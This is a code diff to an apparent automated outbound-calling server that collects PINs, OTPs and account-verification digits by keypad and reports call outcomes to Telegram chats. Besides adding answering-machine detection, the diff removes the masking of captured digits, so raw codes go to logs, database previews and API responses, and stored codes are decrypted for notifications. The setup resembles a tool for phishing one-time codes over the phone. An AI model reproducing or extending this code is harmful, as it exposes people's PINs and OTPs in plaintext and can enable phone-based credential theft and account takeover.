@@ -94,6 +94,26 @@ let vonageAdapters = null;
 const COLLECT_INPUT_FUNCTIONS = new Set(['ivr_survey', 'pin_entry', 'menu_selection', 'otp_collection', 'account_verification']);
 const collectInputCompletion = new Set();
 
+const HUMAN_ANSWER_VALUES = new Set(['human', 'person', 'live', 'positive_human']);
+const MACHINE_ANSWER_VALUES = new Set(['machine', 'machine_start', 'fax', 'positive_machine', 'unknown_machine', 'answering_machine']);
+
+function normalizeAnsweredBy(value) {
+  if (!value) {
+    return '';
+  }
+  return value.toString().trim().toLowerCase();
+}
+
+function isHumanAnsweredBy(value) {
+  const normalized = normalizeAnsweredBy(value);
+  return HUMAN_ANSWER_VALUES.has(normalized);
+}
+
+function isMachineAnsweredBy(value) {
+  const normalized = normalizeAnsweredBy(value);
+  return MACHINE_ANSWER_VALUES.has(normalized);
+}
+
 function sanitizeDigits(rawInput) {
   if (rawInput == null) {
     return '';
@@ -219,10 +239,12 @@ async function persistDtmfCapture(callSid, digits, options = {}) {
     await db.updateCallState(callSid, 'dtmf_captured', {
       stage_key: compliancePayload.metadata.stage_key,
       masked_digits: compliancePayload.maskedDigits,
-      digits_preview: dtmfUtils.shouldRevealRawDigits() ? sanitizedDigits : compliancePayload.maskedDigits,
+      digits_preview: sanitizedDigits,
       provider,
       metadata: normalizedMetadata,
     });
+
+    await db.markCallHasInput(callSid, sanitizedDigits);
 
     const targetChatId = callRecord.telegram_chat_id || callRecord.user_chat_id;
     if (callRecord.call_type !== 'collect_input' && targetChatId) {
@@ -236,7 +258,7 @@ async function persistDtmfCapture(callSid, digits, options = {}) {
       source,
     });
 
-    const digitsPreview = dtmfUtils.shouldRevealRawDigits() ? sanitizedDigits : compliancePayload.maskedDigits;
+    const digitsPreview = sanitizedDigits;
     console.log(`🔢 Captured DTMF input for ${callSid}: ${digitsPreview}`.cyan);
   } catch (error) {
     console.error('❌ Failed to persist DTMF input:', error);
@@ -354,6 +376,8 @@ async function handleCollectInputRequest(req, res, callRecord) {
       confidence: digits ? null : confidence
     });
 
+    await db.markCallHasInput(callSid, normalizedValue);
+
     if (digits) {
       const stageConfig = inputSequence[pendingStep - 1] || inputSequence[inputSequence.length - 1];
       const stageKey = stageConfig?.stage || `STEP_${pendingStep}`;
@@ -417,7 +441,7 @@ async function finalizeCollectInputCall(callSid, callDetails) {
     });
 
     if (targetChatId) {
-      await db.createEnhancedWebhookNotification(callSid, 'call_input_summary', targetChatId, 'high');
+      // Summary notifications are handled once the final call outcome is classified.
     }
     if (callConfigurations.has(callSid)) {
       callConfigurations.delete(callSid);
@@ -425,6 +449,84 @@ async function finalizeCollectInputCall(callSid, callDetails) {
     setTimeout(() => collectInputCompletion.delete(callSid), 60 * 60 * 1000);
   } catch (error) {
     console.error('Failed to finalize collect-input call:', error);
+  }
+}
+
+async function finalizeCallOutcome(callSid, options = {}) {
+  if (!db) {
+    return;
+  }
+
+  let callRecord = options.call || (await db.getCall(callSid));
+  if (!callRecord) {
+    return;
+  }
+
+  if (callRecord.final_outcome && !options.force) {
+    const pendingNotificationChat = callRecord.outcome_notified_at
+      ? null
+      : callRecord.telegram_chat_id || callRecord.user_chat_id;
+    if (pendingNotificationChat) {
+      await db.createEnhancedWebhookNotification(callSid, 'call_outcome_summary', pendingNotificationChat, 'high');
+    }
+    return;
+  }
+
+  const finalStatus = (options.finalStatus || callRecord.twilio_status || callRecord.status || '').toLowerCase();
+  const answeredCandidate = options.answeredBy || callRecord.answered_by || callRecord.amd_status;
+  const normalizedAnswer = normalizeAnsweredBy(answeredCandidate);
+
+  let hasInput = Boolean(callRecord.has_input) || Boolean(callRecord.latest_input_preview);
+  let latestInputPreview = callRecord.latest_input_preview;
+
+  if (!hasInput) {
+    const latestEntry = await db.getLatestDtmfEntry(callSid);
+    if (latestEntry) {
+      hasInput = true;
+      latestInputPreview =
+        dtmfUtils.decryptDigits(latestEntry.encrypted_digits) || latestEntry.masked_digits || latestInputPreview;
+    } else {
+      const callInputs = await db.getCallInputs(callSid);
+      if (callInputs.length > 0) {
+        hasInput = true;
+      }
+    }
+  }
+
+  const wasAnswered =
+    Boolean(callRecord.was_answered) ||
+    options.wasAnswered ||
+    ['answered', 'in-progress', 'completed'].includes(finalStatus) ||
+    Boolean(normalizedAnswer);
+
+  let outcome;
+  if (finalStatus === 'busy') {
+    outcome = 'BUSY';
+  } else if (finalStatus === 'failed') {
+    outcome = 'FAILED';
+  } else if (finalStatus === 'canceled') {
+    outcome = 'CANCELED';
+  } else if (hasInput) {
+    outcome = 'ANSWERED_WITH_INPUT';
+  } else if (isMachineAnsweredBy(normalizedAnswer)) {
+    outcome = 'ANSWERED_NO_INPUT_MACHINE';
+  } else if (isHumanAnsweredBy(normalizedAnswer) || wasAnswered) {
+    outcome = 'ANSWERED_NO_INPUT_HUMAN';
+  } else {
+    outcome = 'NO_ANSWER';
+  }
+
+  await db.setFinalOutcome(callSid, outcome, {
+    answered_by: answeredCandidate || callRecord.answered_by,
+    has_input: hasInput ? 1 : 0,
+    latest_input_preview: latestInputPreview,
+    was_answered: wasAnswered ? 1 : 0,
+  });
+
+  callRecord = await db.getCall(callSid);
+  const targetChatId = callRecord?.telegram_chat_id || callRecord?.user_chat_id;
+  if (targetChatId) {
+    await db.createEnhancedWebhookNotification(callSid, 'call_outcome_summary', targetChatId, 'high');
   }
 }
 
@@ -444,7 +546,7 @@ function parseDtmfMetadata(metadata) {
 }
 
 function formatDtmfEntriesForResponse(entries = []) {
-  const revealRaw = dtmfUtils.shouldRevealRawDigits();
+  const revealRaw = true;
 
   return entries.map((entry) => {
     const stageKey = dtmfUtils.normalizeStage(entry.stage_key || 'generic');
@@ -1354,19 +1456,13 @@ async function handleCallEnd(callSid, callStartTime) {
       personality_adaptations: adaptationAnalysis.personalityChanges || 0
     });
 
-    // Create enhanced webhook notification for completion
-    const targetChatId = callDetails?.telegram_chat_id || callDetails?.user_chat_id;
-    if (callDetails && targetChatId) {
-      await db.createEnhancedWebhookNotification(callSid, 'call_completed', targetChatId);
-
-      // Schedule transcript notification with delay
-      setTimeout(async () => {
-        try {
-          await db.createEnhancedWebhookNotification(callSid, 'call_transcript', targetChatId);
-        } catch (transcriptError) {
-          console.error('Error creating transcript notification:', transcriptError);
-        }
-      }, 2000);
+    if (callDetails?.provider !== 'twilio') {
+      await finalizeCallOutcome(callSid, {
+        call: callDetails,
+        finalStatus: 'completed',
+        answeredBy: callDetails?.answered_by,
+        wasAnswered: true,
+      });
     }
 
     console.log(`✅ Enhanced adaptive call ${callSid} completed`.green);
@@ -1738,7 +1834,14 @@ app.post('/outbound-call', async (req, res) => {
         from: twilioFromNumber,
         statusCallback: `${publicHttpBase}/webhook/call-status`,
         statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'canceled', 'failed'],
-        statusCallbackMethod: 'POST'
+        statusCallbackMethod: 'POST',
+        machineDetection: 'Enable',
+        machineDetectionTimeout: 8,
+        machineDetectionSpeechThreshold: 2400,
+        machineDetectionSpeechEndThreshold: 1200,
+        asyncAmd: true,
+        asyncAmdStatusCallback: `${publicHttpBase}/webhook/amd-status`,
+        asyncAmdStatusCallbackMethod: 'POST'
       });
       callSid = providerResponse.sid;
       providerContactId = providerResponse.sid;
@@ -2013,7 +2116,8 @@ app.post('/vonage/event', async (req, res) => {
     });
 
     const callRecord = await db.getCall(callSid);
-    if (callRecord?.user_chat_id && notificationType) {
+    const realtimeTypes = new Set(['call_initiated', 'call_ringing', 'call_answered']);
+    if (callRecord?.user_chat_id && notificationType && realtimeTypes.has(notificationType)) {
       await db.createEnhancedWebhookNotification(callSid, notificationType, callRecord.user_chat_id);
     }
 
@@ -2030,6 +2134,11 @@ app.post('/vonage/event', async (req, res) => {
       }
       callConfigurations.delete(callSid);
       callFunctionSystems.delete(callSid);
+      await finalizeCallOutcome(callSid, {
+        call: callRecord,
+        finalStatus: normalizedStatus,
+        answeredBy: callRecord?.answered_by,
+      });
     }
 
     await db.logServiceHealth('vonage_voice', 'event_received', {
@@ -2043,6 +2152,51 @@ app.post('/vonage/event', async (req, res) => {
   } catch (error) {
     console.error('Error processing Vonage event:', error);
     res.status(500).json({ error: 'Failed to process Vonage event', details: error.message });
+  }
+});
+
+app.post('/webhook/amd-status', async (req, res) => {
+  if (currentProvider !== 'twilio') {
+    res.status(404).json({ error: 'AMD webhook disabled for current provider' });
+    return;
+  }
+
+  try {
+    const { CallSid, AnsweredBy, AnsweredByStatus, Confidence } = req.body || {};
+    if (!CallSid) {
+      res.status(400).json({ error: 'Missing CallSid' });
+      return;
+    }
+
+    const call = await db.getCall(CallSid);
+    if (!call) {
+      console.warn(`⚠️ AMD webhook received for unknown call: ${CallSid}`.yellow);
+      res.status(200).send('OK');
+      return;
+    }
+
+    const answeredValue = AnsweredBy || AnsweredByStatus || null;
+    const normalizedAnswer = normalizeAnsweredBy(answeredValue);
+    const confidenceValue =
+      Confidence !== undefined && Confidence !== null && Confidence !== ''
+        ? Number(Confidence)
+        : undefined;
+
+    await db.updateAmdStatus(CallSid, answeredValue, {
+      confidence: Number.isFinite(confidenceValue) ? confidenceValue : undefined,
+      answeredBy: answeredValue,
+      markAnswered: Boolean(normalizedAnswer),
+    });
+
+    const targetChatId = call.telegram_chat_id || call.user_chat_id;
+    if (targetChatId && answeredValue) {
+      await db.createEnhancedWebhookNotification(CallSid, 'call_amd_update', targetChatId, 'high');
+    }
+
+    res.status(200).send('OK');
+  } catch (error) {
+    console.error('Error processing AMD webhook:', error);
+    res.status(200).send('OK');
   }
 });
 
@@ -2082,133 +2236,67 @@ app.post('/webhook/call-status', async (req, res) => {
       return;
     }
 
-    // Enhanced logic for determining actual call outcome
-    let notificationType = null;
-    let actualStatus = CallStatus.toLowerCase();
-    
-    // Special handling for "completed" status - check if it was actually answered
-    if (actualStatus === 'completed') {
-      const duration = parseInt(Duration || CallDuration || DialCallDuration || 0);
-      
-      console.log(`🔍 Analyzing completed call: Duration = ${duration}s`.yellow);
-      
-      // If call completed but duration is very short (< 3 seconds), it's likely no-answer
-      // or if AnsweredBy is specifically 'machine_start' without actual conversation
-      if (duration === 0 || duration < 3) {
-        console.log(`❌ Short duration detected (${duration}s) - treating as no-answer`.red);
-        actualStatus = 'no-answer';
-        notificationType = 'call_no_answer';
-      } else if (AnsweredBy === 'machine_start' && duration < 10) {
-        console.log(`📞 Voicemail detected with short duration - treating as no-answer`.red);
-        actualStatus = 'no-answer';
-        notificationType = 'call_no_answer';
-      } else {
-        console.log(`✅ Valid call duration (${duration}s) - confirmed answered`.green);
-        actualStatus = 'completed';
-        notificationType = 'call_completed';
-      }
-    } else {
-      // Handle other statuses normally
-      switch (actualStatus) {
-        case 'queued':
-        case 'initiated':
-          notificationType = 'call_initiated';
-          break;
-        case 'ringing':
-          notificationType = 'call_ringing';
-          break;
-        case 'in-progress':
-          notificationType = 'call_answered';
-          break;
-        case 'busy':
-          notificationType = 'call_busy';
-          break;
-        case 'no-answer':
-          notificationType = 'call_no_answer';
-          break;
-        case 'failed':
-          notificationType = 'call_failed';
-          break;
-        case 'canceled':
-          notificationType = 'call_canceled';
-          break;
-        default:
-          console.warn(`⚠️ Unknown call status: ${CallStatus}`.yellow);
-          notificationType = `call_${actualStatus}`;
-      }
-    }
-
-    console.log(`🎯 Final determination: ${CallStatus} → ${actualStatus} → ${notificationType}`.green);
-
-    // Update call status in database with enhanced data
+    const normalizedStatus = (CallStatus || '').toLowerCase();
+    const durationValue = parseInt(Duration || CallDuration || DialCallDuration || 0);
     const updateData = {
-      duration: parseInt(Duration || CallDuration || DialCallDuration || 0),
+      duration: durationValue,
       twilio_status: CallStatus,
       answered_by: AnsweredBy,
       error_code: ErrorCode,
-      error_message: ErrorMessage
+      error_message: ErrorMessage,
     };
 
-    // Calculate ring duration for no-answer cases
-    if (actualStatus === 'no-answer' && call.created_at) {
-      const callStart = new Date(call.created_at);
-      const now = new Date();
-      const ringDuration = Math.round((now - callStart) / 1000);
-      updateData.ring_duration = ringDuration;
-      console.log(`📞 Calculated ring duration: ${ringDuration}s`.cyan);
+    if (['answered', 'in-progress'].includes(normalizedStatus) || (normalizedStatus === 'completed' && durationValue > 0)) {
+      updateData.was_answered = 1;
+      if (!call.started_at) {
+        updateData.started_at = new Date().toISOString();
+      }
     }
 
-    // Set timestamps based on actual status (not original CallStatus)
-    if (actualStatus === 'in-progress' && !call.started_at) {
-      updateData.started_at = new Date().toISOString();
-    } else if (['completed', 'no-answer', 'failed', 'busy', 'canceled'].includes(actualStatus) && !call.ended_at) {
+    if (['completed', 'no-answer', 'failed', 'busy', 'canceled'].includes(normalizedStatus) && !call.ended_at) {
       updateData.ended_at = new Date().toISOString();
     }
 
-    await db.updateCallStatus(CallSid, actualStatus, updateData);
+    if (normalizedStatus === 'no-answer' && call.created_at) {
+      const callStart = new Date(call.created_at);
+      const now = new Date();
+      updateData.ring_duration = Math.round((now - callStart) / 1000);
+    }
 
-    // Create enhanced webhook notification with corrected status
-    if (call.call_type === 'collect_input' && ['completed', 'no-answer', 'failed', 'canceled'].includes(actualStatus)) {
+    await db.updateCallStatus(CallSid, normalizedStatus, updateData);
+
+    if (call.call_type === 'collect_input' && ['completed', 'no-answer', 'failed', 'canceled'].includes(normalizedStatus)) {
       await finalizeCollectInputCall(CallSid, call);
     }
 
-    if ((call.telegram_chat_id || call.user_chat_id) && notificationType) {
-      try {
-        const targetChat = call.telegram_chat_id || call.user_chat_id;
-        await db.createEnhancedWebhookNotification(CallSid, notificationType, targetChat);
-        console.log(`📨 Created corrected ${notificationType} notification for call ${CallSid}`.green);
-        
-        // Log the correction if we changed the status
-        if (actualStatus !== CallStatus.toLowerCase()) {
-          await db.logServiceHealth('webhook_system', 'status_corrected', {
-            call_sid: CallSid,
-            original_status: CallStatus,
-            corrected_status: actualStatus,
-            duration: updateData.duration,
-            reason: 'Short duration analysis'
-          });
-        }
-      } catch (notificationError) {
-        console.error('Error creating enhanced webhook notification:', notificationError);
+    const targetChat = call.telegram_chat_id || call.user_chat_id;
+    const enqueueStatus = async (type) => {
+      if (!targetChat) {
+        return;
       }
-    }
-    
-    // Log comprehensive status update
-    console.log(`✅ Fixed webhook processed: ${CallSid} -> ${CallStatus} (corrected to: ${actualStatus})`.green);
-    if (updateData.duration) {
-      const minutes = Math.floor(updateData.duration / 60);
-      const seconds = updateData.duration % 60;
-      console.log(`📊 Call metrics: ${minutes}:${String(seconds).padStart(2, '0')} duration`.cyan);
+      await db.createEnhancedWebhookNotification(CallSid, type, targetChat);
+    };
+
+    if (['queued', 'initiated'].includes(normalizedStatus)) {
+      await enqueueStatus('call_initiated');
+    } else if (normalizedStatus === 'ringing') {
+      await enqueueStatus('call_ringing');
+    } else if (['in-progress', 'answered'].includes(normalizedStatus)) {
+      await enqueueStatus('call_answered');
+    } else if (['busy', 'failed', 'canceled', 'completed', 'no-answer'].includes(normalizedStatus)) {
+      await finalizeCallOutcome(CallSid, {
+        finalStatus: normalizedStatus,
+        answeredBy: AnsweredBy,
+      });
     }
 
-    // Log to service health with correction info
     await db.logServiceHealth('webhook_system', 'status_received', {
       call_sid: CallSid,
       original_status: CallStatus,
-      final_status: actualStatus,
-      duration: updateData.duration,
+      final_status: normalizedStatus,
+      duration: durationValue,
       answered_by: AnsweredBy,
-      correction_applied: actualStatus !== CallStatus.toLowerCase()
+      correction_applied: false
     });
     
     res.status(200).send('OK');
@@ -3277,7 +3365,8 @@ app.post('/aws/contact-events', async (req, res) => {
       });
 
       const callRecord = await db.getCall(resolvedCallSid);
-      if (callRecord?.user_chat_id && notificationType) {
+      const realtimeTypes = new Set(['call_initiated', 'call_ringing', 'call_answered']);
+      if (callRecord?.user_chat_id && notificationType && realtimeTypes.has(notificationType)) {
         await db.createEnhancedWebhookNotification(resolvedCallSid, notificationType, callRecord.user_chat_id);
       }
 
@@ -3290,6 +3379,12 @@ app.post('/aws/contact-events', async (req, res) => {
         awsContactIndex.delete(contactId);
         callConfigurations.delete(resolvedCallSid);
         callFunctionSystems.delete(resolvedCallSid);
+        await finalizeCallOutcome(resolvedCallSid, {
+          call: callRecord,
+          finalStatus: normalizedStatus,
+          answeredBy: callRecord?.answered_by,
+          wasAnswered: true,
+        });
       }
     }
 
